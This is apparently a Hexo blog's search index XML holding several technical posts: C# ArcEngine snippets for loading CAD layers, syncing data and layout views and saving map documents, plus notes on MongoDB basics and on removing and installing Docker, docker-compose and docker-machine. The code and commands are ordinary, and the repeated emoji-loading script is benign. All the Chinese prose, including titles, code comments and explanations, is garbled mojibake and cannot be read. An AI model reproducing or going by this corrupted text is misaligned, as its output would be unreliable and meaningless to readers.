###### F3.ä½œä¸ºæ …æ ¼å›¾å±‚åŠ è½½ IWorkspaceFactory pWorkspaceFactory; IWorkspace pWorkspace; ICadDrawingDataset pCadDrawingDataset; ICadDrawingWorkspace pCadDrawingWorkspace; ICadLayer pCadLayer; pWorkspaceFactory = new CadWorkspaceFactoryClass(); pWorkspace = pWorkspaceFactory.OpenFromFile(pPath, 0); pCadDrawingWorkspace = (ICadDrawingWorkspace)pWorkspace; //è·å¾—CADæ–‡ä»¶çš„æ•°æ®é›† pCadDrawingDataset = pCadDrawingWorkspace.OpenCadDrawingDataset(pFileName); pCadLayer = new CadLayerClass(); pCadLayer.CadDrawingDataset = pCadDrawingDataset; mainMapControl.Map.AddLayer(pCadLayer); mainMapControl.ActiveView.Refresh(); mainTOCControl.SetBuddyControl(mainMapControl); ###### åŠ è½½ä¸ªäººåœ°ç†æ•°æ®åº“ ###### åŠ è½½æ–‡ä»¶åœ°ç†æ•°æ®åº“ ` document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>GIS</category>
      </categories>
      <tags>
        <tag>ArcEngine</tag>
        <tag>GIS</tag>
        <tag>C#</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ArcEngineåŒæ­¥æ•°æ®è§†å›¾ä¸å¸ƒå±€è§†å›¾]]></title>
    <url>%2Fposts%2F4c9b4c5b%2F</url>
    <content type="text"><![CDATA[// æ•°æ®è§†å›¾ä¸å¸ƒå±€è§†å›¾åŒæ­¥ private void mainMapControl_OnAfterScreenDraw(object sender, IMapControlEvents2_OnAfterScreenDrawEvent e) { IActiveView pActiveView = (IActiveView)mainPageLayoutControl1.ActiveView.FocusMap; IDisplayTransformation displayTransformation = pActiveView.ScreenDisplay.DisplayTransformation; displayTransformation.VisibleBounds = mainMapControl.Extent; mainPageLayoutControl1.ActiveView.Refresh(); CopyToPageLayout(); // è°ƒç”¨ä¸‹é¢çš„å‡½æ•° } // CopyToPageLayout() å¸ƒå±€è§†å›¾ä¸æ•°æ®è§†å›¾åŒæ­¥ private void CopyToPageLayout() { IObjectCopy pObjectCopy = new ObjectCopyClass(); object copyFromMap = mainMapControl.Map; object copiedMap = pObjectCopy.Copy(copyFromMap); // å¤åˆ¶åœ°å›¾åˆ°copiedMapä¸­ object copyToMap = mainPageLayoutControl1.ActiveView.FocusMap; pObjectCopy.Overwrite(copiedMap, ref copyToMap); // å¤åˆ¶åœ°å›¾ mainPageLayoutControl1.ActiveView.Refresh(); } document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>GIS</category>
      </categories>
      <tags>
        <tag>ArcEngine</tag>
        <tag>GIS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ArcEngineæ–‡ä»¶ä¿å­˜åŠŸèƒ½]]></title>
    <url>%2Fposts%2Fdb6b7e01%2F</url>
    <content type="text"><![CDATA[åœ°å›¾æ–‡æ¡£ä¿å­˜é—®é¢˜ï¼šç©ºæ–‡æ¡£ä¹Ÿèƒ½ä¿å­˜private void saveToolStrip_Click(object sender, EventArgs e) { try { string sMxdFileName = mainMapControl.DocumentFilename; IMapDocument pMapDocument = new MapDocumentClass(); //æ£€æŸ¥æ–‡æ¡£æ˜¯å¦ä¸ºç©ºä»¥åŠæœ‰æ•ˆæ€§ if (sMxdFileName != null && mainMapControl.CheckMxFile(sMxdFileName)) { if (pMapDocument.get_IsReadOnly(sMxdFileName)) { MessageBox.Show("åœ°å›¾æœ¬å½“ä¸ºåªè¯»ï¼Œä¸èƒ½ä¿å­˜ï¼"); pMapDocument.Close(); return; } else { SaveFileDialog pSaveFileDialog = new System.Windows.Forms.SaveFileDialog(); pSaveFileDialog.Title = "è¯·é€‰æ‹©ä¿å­˜è·¯å¾„"; pSaveFileDialog.Filter = "ArcMapæ–‡æ¡£(*.mxd)|*.mxd|ArcMapæ¨¡æ¿(*.mxt)|*.mxt"; //å½“ç›¸åŒçš„æ–‡ä»¶å­˜åœ¨æ˜¯æç¤ºé”™è¯¯ pSaveFileDialog.OverwritePrompt = true; pSaveFileDialog.RestoreDirectory = true; if (pSaveFileDialog.ShowDialog() == DialogResult.OK) { //è·å–åå­— sMxdFileName = pSaveFileDialog.FileName; } else { return; } pMapDocument.New(sMxdFileName); pMapDocument.ReplaceContents(mainMapControl.Map as IMxdContents); //ä¿å­˜ä¸ºç»å¯¹è·¯å¾„ pMapDocument.Save(pMapDocument.UsesRelativePaths, true); pMapDocument.Close(); MessageBox.Show("ä¿å­˜æ–‡æ¡£æˆåŠŸ"); } } } catch (Exception ex) { MessageBox.Show(ex.Message); } } åœ°å›¾æ–‡æ¡£å¦å­˜ä¸º1private void saveAsToolStrip_Click(object sender, EventArgs e) { try { SaveFileDialog pSaveDialog = new System.Windows.Forms.SaveFileDialog(); pSaveDialog.Title = "å¦å­˜ä¸º"; pSaveDialog.OverwritePrompt = true;//å½“ç›¸åŒçš„æ–‡ä»¶å­˜åœ¨æ˜¯æç¤ºé”™è¯¯ pSaveDialog.Filter = "ArcMapæ–‡æ¡£(*.mxd)|*.mxd|ArcMapæ¨¡æ¿(*.mxt)|*.mxt"; pSaveDialog.RestoreDirectory = true; if (pSaveDialog.ShowDialog() == DialogResult.OK) { string sFilePath = pSaveDialog.FileName; IMapDocument pMapDocument = new MapDocumentClass(); pMapDocument.New(sFilePath); pMapDocument.ReplaceContents(mainMapControl.Map as IMxdContents); pMapDocument.Save(true, true); pMapDocument.Close(); } } catch (Exception ex) { MessageBox.Show(ex.Message); } } åœ°å›¾å¦å­˜ä¸º2 ICommand command = new ControlsSaveAsDocCommandClass(); command.OnCreate(mainMapControl.Object); command.OnClick(); document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>GIS</category>
      </categories>
      <tags>
        <tag>ArcEngine</tag>
        <tag>GIS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MongoDBåˆè¯•åŠåŸºæœ¬æ“ä½œ]]></title>
    <url>%2Fposts%2F28f19af%2F</url>
    <content type="text"><![CDATA[åˆ†å¸ƒå¼ï¼šä¸€ä¸ªä»»åŠ¡åˆ†æˆå¤šä¸ªå­ä»»åŠ¡å®Œæˆ ï¼ˆå‰¯æ‰‹ï¼‰ é›†ç¾¤ï¼šä¸€ä¸ªä»»åŠ¡ç”±å¤šæ€æœåŠ¡å™¨åŒæ—¶æœåŠ¡ å¤§æ•°æ® æ–‡æ¡£ç»“æ„ï¼Œæµ·é‡æ•°æ®ï¼Œå¤§å®¹é‡å­˜å‚¨ï¼Œé«˜æ ¡å­˜å‚¨å¤§é‡äºŒè¿›åˆ¶æ–‡ä»¶ åœºæ™¯ï¼š 1.éœ€è¦ä¸æ–­æ‰©å®¹ï¼› 2.æ–°åº”ç”¨ï¼Œéœ€æ±‚ä¼šå˜ï¼Œæ•°æ®æ¨¡å‹æ— æ³•ç¡®å®šï¼› 3.é«˜å¯ç”¨ï¼ˆä¸å®•æœºï¼‰ 4.éœ€è¦æ•´åˆå¤šä¸ªå¤–éƒ¨æ•°æ®æº SQLæœ¯è¯­ MongoDBæœ¯è¯­ è§£é‡Šè¯´æ˜ database database æ•°æ®åº“ table collection æ•°æ®åº“è¡¨/é›†åˆ row document æ•°æ®è®°å½•è¡Œ/æ–‡æ¡£ column field å­—æ®µ/åŸŸ index index ç´¢å¼• table joins è¡¨è¿æ¥ï¼ŒMongoDBä¸æ”¯æŒ primary key primary key ä¸»é”®ï¼ŒMongoDBè‡ªåŠ¨å°†_idå­—æ®µè®¾ç½®ä¸ºä¸»é”® æ–‡æ¡£ï¼šå°±æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œç”±é”®å€¼å¯¹æ„æˆï¼Œæ˜¯jsonçš„ä¸€ç§æ‰©å±• Bsonå½¢å¼ å­—æ®µ(åŸŸ)ä¹‹é—´å¯ä»¥æ˜¯ä¸åŒç±»å‹: {â€˜bookâ€™:â€™xxxâ€™, â€˜heroâ€™:â€™yyyâ€™}` {'name':'sjz', 'age':18} ä¸‹è½½å®Œæˆåï¼Œå°†å¯æ‰§è¡Œæ–‡ä»¶æ·»åŠ åˆ°PATHè·¯å¾„ä¸­ export PATH=/user/local/mondodb/bin:$PATH æœåŠ¡ç«¯mongod é…ç½®æ–‡ä»¶ä½ç½® etc/mongod.conf é»˜è®¤ç«¯å£ 27017 æŸ¥çœ‹ç«¯å£ï¼š ss -tnl æ•°æ®åº“æœåŠ¡å¯åŠ¨/åœæ­¢/é‡å¯ sudo service mongodb start/stop/restart æŸ¥çœ‹çŠ¶æ€ï¼š sudo service mongodb status å®¢æˆ·ç«¯å¯åŠ¨ mongo è¿æ¥mongodb: # è¿›å…¥ mongo # é€€å‡º exit æˆ–è€… ctrl + c æˆ– quit() æ•°æ®åº“çº§æ“ä½œï¼š1.æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“ show dbs 2.åˆ›å»ºæ•°æ®åº“ use mydb # åˆ›å»ºä¹‹åï¼Œå¦‚æœä¸æ’å…¥æ•°æ®çš„è¯ï¼Œ show dbsæ˜¯çœ‹ä¸åˆ°åˆšå»ºç«‹çš„æ•°æ®åº“çš„ 3.æ˜¾ç¤ºå½“å‰æ•°æ®åº“ db 4.åˆ é™¤æ•°æ®åº“ db.dropDatabase() # æ³¨æ„å¤§å°å†™ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ•°æ®åº“</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
        <tag>æ•°æ®åº“</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ArcEngine"ä¸‡èƒ½""åŠ è½½æ•°æ®æ–¹æ³•]]></title>
    <url>%2Fposts%2Feb2e44a3%2F</url>
    <content type="text"><![CDATA[ä¸‹é¢ä»‹ç»ä¸€ç§â€œä¸‡èƒ½â€åŠ è½½æ•°æ®çš„åŠæ³•ï¼š // åŠ è½½å¾ˆå¤šç§æ•°æ® ICommand command = new ControlsAddDataCommandClass(); command.OnCreate(mainMapControl.Object); command.OnClick(); mainMapControl.ActiveView.Refresh(); document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>GIS</category>
      </categories>
      <tags>
        <tag>ArcEngine</tag>
        <tag>GIS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[dockeråˆ é™¤é•œåƒå’Œå®¹å™¨]]></title>
    <url>%2Fposts%2F329caef9%2F</url>
    <content type="text"><![CDATA[å…ˆæŸ¥çœ‹å®¹å™¨è¿è¡ŒçŠ¶æ€ docker ps -a æ‰¾åˆ°imageå¯¹åº”çš„å®¹å™¨ï¼Œå…ˆstop # id docker stop d751d48a6d0a å†åˆ é™¤å®¹å™¨ docker rm d751d48a6d0a æœ€åæ‰èƒ½åˆ é™¤é•œåƒ docker rmi fce289e99eb9 # æŸ¥çœ‹é•œåƒï¼Œåˆ é™¤ok docker images æ³¨ï¼šrmä¸rmiçš„åŒºåˆ«rm Remove one or more containers rmi Remove one or more images document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[dockerå®‰è£…]]></title>
    <url>%2Fposts%2F327177db%2F</url>
    <content type="text"><![CDATA[dockerï¼šæœ‰ä¸¤ä¸ªç‰ˆæœ¬:docker-ce(ç¤¾åŒºç‰ˆ)å’Œdocker-ee(ä¼ä¸šç‰ˆ)ã€‚ ç¬”è€…è¿™é‡Œä»‹ç»å®‰è£…æˆ–å‡çº§çš„æ˜¯æœ€æ–°ç‰ˆdocker-ce(ç¤¾åŒºç‰ˆ)ã€‚ å‚è€ƒå®˜ç½‘åœ°å€ï¼šhttps://docs.docker.com/engine/installation/linux/docker-ce/ubuntu/#os-requirements docker-compseï¼šå¯è¿è¡Œå’Œç®¡ç†å¤šä¸ªdockerå®¹å™¨ã€‚ docker-machineï¼šdockerå®˜æ–¹æä¾›çš„dockerç®¡ç†å·¥å…·ã€‚å¯ç®¡ç†å¤šä¸ªdockerä¸»æœºï¼Œå¯æ­å»ºswarmé›†ç¾¤ã€‚ ä¸€ã€dockerå®‰è£…1ï¼Œå¸è½½æ—§ç‰ˆæœ¬docker å…¨æ–°å®‰è£…æ—¶ï¼Œæ— éœ€æ‰§è¡Œè¯¥æ­¥éª¤ $ sudo apt-get remove docker docker-engine docker.io 2ï¼Œæ›´æ–°ç³»ç»Ÿè½¯ä»¶ $ sudo apt-get update 3ï¼Œå®‰è£…ä¾èµ–åŒ… $ sudo apt-get install \ apt-transport-https \ ca-certificates \ curl \ software-properties-common 4ï¼Œæ·»åŠ å®˜æ–¹å¯†é’¥ æ‰§è¡Œè¯¥å‘½ä»¤æ—¶ï¼Œå¦‚é‡åˆ°é•¿æ—¶é—´æ²¡æœ‰å“åº”è¯´æ˜ç½‘ç»œè¿æ¥ä¸åˆ°dockerç½‘ç«™ï¼Œéœ€è¦ä½¿ç”¨ä»£-ç†è¿›è¡Œã€‚ $ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - æ˜¾ç¤ºOK,è¡¨ç¤ºæ·»åŠ æˆåŠŸ. 5ï¼Œæ·»åŠ ä»“åº“ $ sudo add-apt-repository \ "deb [arch=amd64] https://download.docker.com/linux/ubuntu \ $(lsb_release -cs) \ stable" 6ï¼Œå†æ¬¡æ›´æ–°è½¯ä»¶ ç»å®è·µï¼Œè¿™ä¸€æ­¥ä¸èƒ½å¤Ÿçœç•¥ï¼Œæˆ‘ä»¬éœ€è¦å†æ¬¡æŠŠè½¯ä»¶æ›´æ–°åˆ°æœ€æ–°ï¼Œå¦åˆ™ä¸‹ä¸€æ­¥æœ‰å¯èƒ½ä¼šæŠ¥é”™ã€‚ $ sudo apt-get update 7ï¼Œå®‰è£…docker å¦‚æœæƒ³æŒ‡å®šå®‰è£…æŸä¸€ç‰ˆæœ¬ï¼Œå¯ä½¿ç”¨ sudo apt-get install docker-ce= å‘½ä»¤ï¼ŒæŠŠæ›¿æ¢ä¸ºå…·ä½“ç‰ˆæœ¬å³å¯ã€‚ ä»¥ä¸‹å‘½ä»¤æ²¡æœ‰æŒ‡å®šç‰ˆæœ¬ï¼Œé»˜è®¤å°±ä¼šå®‰è£…æœ€æ–°ç‰ˆ $ sudo apt-get install docker-ce 8ï¼ŒæŸ¥çœ‹dockerç‰ˆæœ¬ $ docker -v æ˜¾ç¤ºâ€œDocker version 17.09.0-ce, build afdb6d4â€å­—æ ·ï¼Œè¡¨ç¤ºå®‰è£…æˆåŠŸã€‚ äºŒã€docker-composeå®‰è£…1ï¼Œä¸‹è½½docker-compose $ sudo curl -L https://github.com/docker/compose/releases/download/1.17.0/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose 2ï¼Œæˆæƒ $ sudo chmod +x /usr/local/bin/docker-compose 3ï¼ŒæŸ¥çœ‹ç‰ˆæœ¬ä¿¡æ¯ $ docker-compose --version æ˜¾ç¤ºå‡ºç‰ˆæœ¬ä¿¡æ¯ï¼Œå³å®‰è£…æˆåŠŸã€‚ ä¸‰ã€docker-machineå®‰è£…è¯´æ˜ï¼šdocker-machineçš„ä½¿ç”¨æ˜¯è¦åŸºäºvirtualBoxçš„ã€‚å¦‚æœæ²¡æœ‰å®‰è£…å®‰è£…è¿‡ï¼Œè¯·å…ˆå®‰è£…virtualBoxã€‚ 1ï¼Œå®‰è£…virtualBox ç™»å½•virtualBoxå®˜ç½‘ï¼šhttps://www.virtualbox.org/wiki/Linux_Downloads æ‰¾åˆ°â€Ubuntu 16.04 (â€œXenialâ€) i386 | AMD64â€å­—æ ·ï¼Œç‚¹å‡»â€œAMD64â€è¿›è¡Œä¸‹è½½ã€‚ ä¸‹è½½åï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤è¿›è¡Œå®‰è£…ï¼š $ sudo dpkg -i virtualbox-5.2_5.2.0-118431_Ubuntu_xenial_amd64.deb 2ï¼Œä¸‹è½½å¹¶å®‰è£…docker-machine $ curl -L https://github.com/docker/machine/releases/download/v0.13.0/docker-machine-`uname -s`-`uname -m` &gt;/tmp/docker-machine &amp;&amp; chmod +x /tmp/docker-machine &amp;&amp; sudo cp /tmp/docker-machine /usr/local/bin/docker-machine 3ï¼ŒæŸ¥çœ‹ç‰ˆæœ¬ä¿¡æ¯ $ docker-machine version æ˜¾ç¤ºå‡ºç‰ˆæœ¬ä¿¡æ¯ï¼Œå³å®‰è£…æˆåŠŸã€‚ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
</search>
